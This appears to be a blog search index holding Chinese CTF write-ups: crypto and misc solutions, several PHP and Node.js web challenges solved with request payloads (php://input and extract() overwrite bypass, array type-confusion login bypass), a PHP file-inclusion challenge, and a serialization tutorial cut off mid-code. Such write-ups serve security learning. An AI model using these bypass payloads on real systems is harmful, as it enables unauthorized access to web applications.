<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CTF 校赛 WriteUp</title>
    <link href="/2022/04/03/CTF%E6%A0%A1%E8%B5%9BWriteUp/"/>
    <url>/2022/04/03/CTF%E6%A0%A1%E8%B5%9BWriteUp/</url>
    
    <content type="html"><![CDATA[<h2 id="HelloCrypto"><a href="#HelloCrypto" class="headerlink" title="HelloCrypto"></a>HelloCrypto</h2><p>在 task.py 发现从原文到密文的对应算法为</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">a = [<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">7</span>,<span class="hljs-number">17</span>,<span class="hljs-number">23</span>]<br>b = [<span class="hljs-number">4</span>,<span class="hljs-number">9</span>,<span class="hljs-number">12</span>,<span class="hljs-number">16</span>,<span class="hljs-number">20</span>,<span class="hljs-number">22</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>    result += <span class="hljs-built_in">chr</span>(((<span class="hljs-built_in">ord</span>(data[i]) - <span class="hljs-number">97</span>) * a[i % <span class="hljs-built_in">len</span>(a)] + b[i % <span class="hljs-built_in">len</span>(b)]) % <span class="hljs-number">26</span> + <span class="hljs-number">97</span>)<br></code></pre></div></td></tr></table></figure><p>编写对应的逆向算法</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime <span class="hljs-keyword">as</span> getprime ,long_to_bytes,bytes_to_long,inverse<br>dic = string.ascii_lowercase<br>a = [<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">7</span>,<span class="hljs-number">17</span>,<span class="hljs-number">23</span>]<br>b = [<span class="hljs-number">4</span>,<span class="hljs-number">9</span>,<span class="hljs-number">12</span>,<span class="hljs-number">16</span>,<span class="hljs-number">20</span>,<span class="hljs-number">22</span>]<br>result = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./result.txt&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).read().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>data=<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(result)):<br>    m=<span class="hljs-built_in">ord</span>(result[i])-<span class="hljs-number">97</span><br>    x=inverse(a[i%<span class="hljs-number">5</span>],<span class="hljs-number">26</span>)<br>    x=x*(m-b[i%<span class="hljs-number">6</span>])<br>    <span class="hljs-keyword">if</span> (x &lt; <span class="hljs-number">0</span>):<br>        x=x+((-<span class="hljs-number">1</span>) * x // <span class="hljs-number">26</span>+<span class="hljs-number">1</span>)*<span class="hljs-number">26</span><br>    x=x%<span class="hljs-number">26</span><br>    x+=<span class="hljs-number">97</span><br>    data+=<span class="hljs-built_in">chr</span>(x)<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./data.txt&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>).write(data.encode())<br></code></pre></div></td></tr></table></figure><p>在 data.txt 文件末尾找到 flag</p><h2 id="HelloPaillier"><a href="#HelloPaillier" class="headerlink" title="HelloPaillier"></a>HelloPaillier</h2><p>使用 yafu 分解 n 为 p*q ，带入 Paillier 算法进行解密，对得到的数据作转换成字符得到 flag</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 使用 yafu 解得</span><br>p=<span class="hljs-number">80006336965345725157774618059504992841841040207998249416678435780577798937819</span><br>q=<span class="hljs-number">80006336965345725157774618059504992841841040207998249416678435780577798937447</span><br><br>g = n+<span class="hljs-number">1</span><br>lmda = lcm(p-<span class="hljs-number">1</span>,q-<span class="hljs-number">1</span>)<br>v1 = <span class="hljs-built_in">pow</span>(c,lmda,n**<span class="hljs-number">2</span>)<br>v2 = <span class="hljs-built_in">pow</span>(g,lmda,n**<span class="hljs-number">2</span>)<br>v1 = (v1-<span class="hljs-number">1</span>)//n<br>v2 = (v2-<span class="hljs-number">1</span>)//n<br>v2 = invert(v2,n)<br>flag_data = (v1*v2)%n<br>true_flag = long_to_bytes(flag_data)<br></code></pre></div></td></tr></table></figure><h2 id="真正的CTF选手"><a href="#真正的CTF选手" class="headerlink" title="真正的CTF选手"></a>真正的CTF选手</h2><p>打开 txt 文件得 flag</p><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>文件名 <code>bear.txt</code> 提示网站与熊论道<br>进入 <code>http://hi.pcmoe.net/</code> 输入文件内容得到 flag</p><h2 id="EasyEncode"><a href="#EasyEncode" class="headerlink" title="EasyEncode"></a>EasyEncode</h2><ol><li>对字符串摩斯解码，发现 <code>%u</code> 格式，得到 UTF-8 编码字符串</li><li>偏移每个 UTF-8 字符 <code>%u25xx</code> 到 <code>%u00xx</code></li><li>UTF-8 字符串解码，发现 \u 格式，得到 Unicode 编码字符串</li><li>Unicode 编码字符串解码得到 base64 编码字符串</li><li>base64 解码得到 flag</li></ol><h2 id="EasyWAV"><a href="#EasyWAV" class="headerlink" title="EasyWAV"></a>EasyWAV</h2><p>以波形图方式查看 wav 文件，发现文件尾端波形呈现出方波特征，考虑是追加了数据</p><p>![image-20220404074822410](C:\Users\Zero feammer\AppData\Roaming\Typora\typora-user-images\image-20220404074822410.png)</p><p>截取该部分以 hex 形式查看文件内容，发现 flag</p><figure class="highlight tap"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs tap">00<span class="hljs-number"> 01 </span>02<span class="hljs-number"> 03 </span>04<span class="hljs-number"> 05 </span>06<span class="hljs-number"> 07 </span>08<span class="hljs-number"> 09 </span>0A 0B 0C 0D 0E 0F  Decode Text<br><br>66<span class="hljs-number"> 66 </span>66<span class="hljs-number"> 66 </span>66<span class="hljs-number"> 66 </span>66<span class="hljs-number"> 66 </span>66<span class="hljs-number"> 66 </span>66<span class="hljs-number"> 66 </span>66<span class="hljs-number"> 66 </span>66<span class="hljs-number"> 66 </span> ffffffffffffffff<br>......<br>6C 6C 6C 6C 6C 6C 6C 6C 6C 6C 6C 6C 6C 6C 6C 6C  llllllllllllllll<br>......<br>61<span class="hljs-number"> 61 </span>61<span class="hljs-number"> 61 </span>61<span class="hljs-number"> 61 </span>61<span class="hljs-number"> 61 </span>61<span class="hljs-number"> 61 </span>61<span class="hljs-number"> 61 </span>61<span class="hljs-number"> 61 </span>61<span class="hljs-number"> 61 </span> aaaaaaaaaaaaaaaa<br>......<br>67<span class="hljs-number"> 67 </span>67<span class="hljs-number"> 67 </span>67<span class="hljs-number"> 67 </span>67<span class="hljs-number"> 67 </span>67<span class="hljs-number"> 67 </span>67<span class="hljs-number"> 67 </span>67<span class="hljs-number"> 67 </span>67<span class="hljs-number"> 67 </span> gggggggggggggggg<br>......<br></code></pre></div></td></tr></table></figure><h2 id="Simplest-php"><a href="#Simplest-php" class="headerlink" title="Simplest_php"></a>Simplest_php</h2><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>];<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>) &amp;&amp; (<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$a</span>, <span class="hljs-string">&#x27;r&#x27;</span>)) === <span class="hljs-string">&#x27;I want flag&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$ceshi</span>)) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$flag</span>));<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$ceshi</span> == <span class="hljs-variable">$content</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$true_flag</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;try harder&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;try&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>首先 <code>isset($a) &amp;&amp; (file_get_contents($a, &#39;r&#39;)) === &#39;I want flag&#39;</code> 处需要绕过 <code>file_get_contents()</code></p><p><code>file_get_contents($fileName)</code> 会把 <code>$fileName</code> 文件的内容读入一个字符串</p><p>考虑使用 <code>php://input</code> 绕过，用 POST 方法传入要 GET 的参数 <code>$a</code></p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">POST <span class="hljs-regexp">/?a=php:/</span><span class="hljs-regexp">/input HTTP/</span><span class="hljs-number">1.1</span><br>...<br>I want flag<br></code></pre></div></td></tr></table></figure><p>在 <code>$content = trim(file_get_contents($flag))</code> 中利用 <code>trim()</code> 会去除字符串首尾的空白字符，传入空白的 <code>$ceshi</code> 和 <code>$flag</code> 使得 <code>$content</code> 为空，绕过 <code>$ceshi == $content</code></p><p>Payload</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /?ceshi=&amp;flag=&amp;a=php://input HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">121.40.176.232:8001</span><br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">95</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4638</span>.<span class="hljs-number">54</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">11</span><br><br><span class="hljs-attribute">I</span> want flag<br></code></pre></div></td></tr></table></figure><p>返回得到 flag{Php_1s_tHe_B3st_L@ngua9e_In_Th3_w0rld}</p><h2 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h2><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[username] == <span class="hljs-string">&quot;admin&quot;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello admin&quot;</span>;<br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$_GET</span>[password] == <span class="hljs-string">&quot;61dctf&quot;</span>) &#123;  <span class="hljs-comment">//Welcome to61dCTF</span><br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>首先正常传入 username ，在 <code>$_GET[password] ==&quot;61dctf&quot;</code> 语句处发现有从右向左书写的文字 ，选择直接在页面上 ctrl+CV变量名和值</p><figure class="highlight llvm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs llvm"><span class="hljs-symbol">http:</span>//<span class="hljs-number">121.40</span>.<span class="hljs-number">176.232</span>:<span class="hljs-number">8002</span>/?username<span class="hljs-operator">=</span>admin&amp;<span class="hljs-variable">%E2</span><span class="hljs-variable">%80</span><span class="hljs-variable">%AE</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%81</span><span class="hljs-variable">%A6CTF</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%81</span><span class="hljs-variable">%A9</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%81</span><span class="hljs-variable">%A6password</span><span class="hljs-operator">=</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%80</span><span class="hljs-variable">%AE</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%81</span><span class="hljs-variable">%A661d</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%81</span><span class="hljs-variable">%A9</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%81</span><span class="hljs-variable">%A661dctf</span><br></code></pre></div></td></tr></table></figure><p>得到 flag{We1c0me_TO_61d!!!}</p><h2 id="simple-answer"><a href="#simple-answer" class="headerlink" title="simple answer"></a>simple answer</h2><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$my_var</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hack&#x27;</span>];<br><span class="hljs-title function_ invoke__">set_error_handler</span>(<br>    function() <span class="hljs-keyword">use</span>(&amp;$<span class="hljs-title">flag</span>) &#123;<br>        <span class="hljs-title">echo</span> $<span class="hljs-title">flag</span>;<br>    &#125;<br>);<br><span class="hljs-variable">$flag</span>.=<span class="hljs-variable">$my_var</span> ;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p><code>set_error_handler()</code> 函数设置用户定义的错误处理函数，使用 <code>hack[]=</code> 制造传入错误，得到 flag{php_api_c0nvert_function_has_bug_81705}</p><h2 id="easy-nodejs"><a href="#easy-nodejs" class="headerlink" title="easy_nodejs"></a>easy_nodejs</h2><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> salt = <span class="hljs-string">&#x27;nooooooooodejssssssssss8_issssss_beeeeest&#x27;</span> <span class="hljs-comment">// hash 盐</span><br><span class="hljs-keyword">const</span> adminHash = (<span class="hljs-title function_">sha256</span>(<span class="hljs-title function_">sha256</span>(salt + <span class="hljs-string">&#x27;admin&#x27;</span>) + <span class="hljs-title function_">sha256</span>(salt + <span class="hljs-string">&#x27;admin&#x27;</span>))).<span class="hljs-title function_">toString</span>()<br><span class="hljs-comment">// some code</span><br><span class="hljs-keyword">if</span> (req.<span class="hljs-property">method</span> === <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br><span class="hljs-keyword">if</span> (req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span> &amp;&amp; req.<span class="hljs-property">body</span>.<span class="hljs-property">password</span>) &#123;<br><span class="hljs-comment">//some code</span><br><span class="hljs-keyword">if</span>(!username || !password || username === password || username.<span class="hljs-property">length</span> === password.<span class="hljs-property">length</span> || username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br><span class="hljs-comment">// some code, fail case</span><br>&#125;<br><span class="hljs-keyword">const</span> hash = (<span class="hljs-title function_">sha256</span>(<span class="hljs-title function_">sha256</span>(salt + username) + <span class="hljs-title function_">sha256</span>(salt + password))).<span class="hljs-title function_">toString</span>();<br><span class="hljs-keyword">if</span> (hash === adminHash) &#123;<br><span class="hljs-comment">//some code, success case</span><br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// some code, fail case</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// some code, fail case</span><br>&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>查看 index.js ，发现要登录才能返回 flag ，条件是 <code>hash === adminHash</code></p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> adminHash = (<span class="hljs-title function_">sha256</span>(<span class="hljs-title function_">sha256</span>(salt + <span class="hljs-string">&#x27;admin&#x27;</span>) + <span class="hljs-title function_">sha256</span>(salt + <span class="hljs-string">&#x27;admin&#x27;</span>))).<span class="hljs-title function_">toString</span>();<br><span class="hljs-keyword">const</span> hash = (<span class="hljs-title function_">sha256</span>(<span class="hljs-title function_">sha256</span>(salt + username) + <span class="hljs-title function_">sha256</span>(salt + password))).<span class="hljs-title function_">toString</span>();<br></code></pre></div></td></tr></table></figure><p>构造 POST 请求传入 <code>username=admin&amp;password=admin</code> ，发现被 <code>username === &#39;admin&#39;</code> 阻断</p><p>再看 <code>sha256(salt + username)</code> ，利用数组拼接和强类型比较的漏洞，传入 <code>username[]=admin&amp;password=admin</code> ，绕过 <code>username === &#39;admin&#39;</code> 和 <code>username === &#39;admin&#39;</code></p><p>Payload</p><figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>121.40.176.232:10001<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>31<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://121.40.176.232:10001<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://121.40.176.232:10001/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-pgsql">username[]=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=<span class="hljs-keyword">admin</span></span><br></code></pre></div></td></tr></table></figure><p>得到 flag{nodejs_1s_v3ry_3@sy}</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>php</tag>
      
      <tag>misc</tag>
      
      <tag>crypto</tag>
      
      <tag>aes</tag>
      
      <tag>paillier</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php 本地文件包含漏洞(LFI)</title>
    <link href="/2021/11/19/LFI%E6%BC%8F%E6%B4%9E_include_require/"/>
    <url>/2021/11/19/LFI%E6%BC%8F%E6%B4%9E_include_require/</url>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php+HTML">&lt;html&gt;<br>&lt;title&gt;asdf&lt;/title&gt;<br>&lt;?php<br>error_reporting(0);<br>if(!$_GET[file])<br>&#123;<br>echo &#x27;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&#x27;;<br>&#125;<br>$file=$_GET[&#x27;file&#x27;];<br>if( strstr($file,&quot;../&quot;   ) ||<br>stristr($file,&quot;tp&quot;   ) ||<br>stristr($file,&quot;input&quot;) ||<br>stristr($file,&quot;data&quot;)    )<br>&#123;<br>echo &quot;Oh no!&quot;;<br>exit();<br>&#125;<br>include($file);<br>//flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;<br>?&gt;<br>&lt;/html&gt;<br></code></pre></div></td></tr></table></figure><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php序列化与反序列化</title>
    <link href="/2021/11/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2021/11/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h2 id="serialize-序列化函数"><a href="#serialize-序列化函数" class="headerlink" title="serialize() 序列化函数"></a>serialize() 序列化函数</h2><h3 id="1-对于类变量-public-、protected-、private-序列化的区别"><a href="#1-对于类变量-public-、protected-、private-序列化的区别" class="headerlink" title="1. 对于类变量 public 、protected 、private 序列化的区别"></a>1. 对于类变量 public 、protected 、private 序列化的区别</h3><p><strong>在 url 传参时注意区分！！！</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php+HTML">&lt;?php<br>class myClass&#123;<br>    public     $first  = 123  ;<br>    protected  $second = &quot;456&quot;;<br>    private    $third  = &quot;789&quot;;<br>&#125;<br>echo serialize(new myClass());<br></code></pre></div></td></tr></table></figure><p>有如下结果</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php+HTML">O:7:&quot;myClass&quot;:3:&#123;s:5:&quot;first&quot;;i:123;s:9:&quot;*second&quot;;s:3:&quot;456&quot;;s:14:&quot;myClassthird&quot;;s:3:&quot;789&quot;;&#125;<br></code></pre></div></td></tr></table></figure><p>由上图实验发现，区别只在于对变量名添加了标记：</p><p><strong>public</strong>       无标记，变量名不变，长度不变 <code>s:5:&quot;first&quot;;i:123</code><br><strong>protected</strong> 在变量名前添加标记 \00*\00 ，长度加3 <code>s:9:&quot;\00*\00second&quot;;s:&quot;456&quot;</code><br><strong>private</strong>      在变量名前添加标记 \00(classname)\00 ，长度 + 2 + 类名长度 <code>s:14:&quot;myClassthird&quot;;s:3:&quot;789&quot;</code></p><h3 id="2-sleep-函数"><a href="#2-sleep-函数" class="headerlink" title="2. __sleep() 函数"></a>2. __sleep() 函数</h3><p>在调用 <code>serialize()</code> 函数前执行</p><h2 id="unserialize-反序列化函数"><a href="#unserialize-反序列化函数" class="headerlink" title="unserialize() 反序列化函数"></a>unserialize() 反序列化函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php+HTML">&lt;?php<br>class myClass&#123;<br>    public     $first  = 123;<br>    protected  $second = &quot;456&quot;;<br>    private    $third  = &quot;789&quot;;<br>&#125;<br>$str = 